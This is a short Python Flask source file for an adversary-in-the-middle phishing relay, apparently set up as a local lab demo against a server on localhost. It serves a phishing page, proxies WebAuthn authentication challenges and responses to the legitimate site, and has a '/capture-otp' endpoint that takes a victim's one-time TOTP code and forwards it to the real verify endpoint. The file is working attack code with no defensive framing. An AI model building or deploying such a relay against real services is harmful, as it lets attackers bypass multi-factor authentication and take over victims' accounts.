from flask import Flask, request, jsonify, render_template, Response
import requests
from fido2 import cbor

app = Flask(__name__, template_folder="templates", static_folder="static")

LEGIT_BASE = "http://localhost:5000"
FORWARD_OTP_URL = f"{LEGIT_BASE}/mfa/totp/verify"

LEGIT = requests.Session()

@app.route("/")
def phish():
    return render_template("phish.html")

@app.get("/relay/authenticate")
def relay_authenticate():
    username = request.args.get("username")
    if not username:
        return {"error": "missing username"}, 400
    r = LEGIT.post(
        f"{LEGIT_BASE}/webauthn/api/authenticate",
        json={"username": username},
        headers={"Accept": "application/cbor"},
        timeout=5,
    )
    return Response(r.content, status=r.status_code, mimetype="application/cbor")

@app.post("/relay/complete")
def relay_complete():
    body = request.get_data()  
    r = LEGIT.post(
        f"{LEGIT_BASE}/webauthn/api/authenticate/complete",
        data=body,
        headers={"Content-Type": "application/cbor", "Accept": "application/cbor"},
        timeout=5,
    )
    return Response(r.content, status=r.status_code, mimetype=r.headers.get("Content-Type","application/cbor"))

@app.post("/capture-otp")
def capture_otp():
    data = request.get_json() or {}
    username = data.get("username")
    token = data.get("token") or data.get("otp")  
    if not username or not token:
        return jsonify({"status":"error","reason":"missing fields"}), 400
    r = LEGIT.post(FORWARD_OTP_URL, json={"username": username, "token": token}, timeout=5)
    return jsonify({"status":"forwarded","legit_status": r.status_code, "legit_text": r.text})



if __name__ == "__main__":
    app.run(port=5001, debug=True)
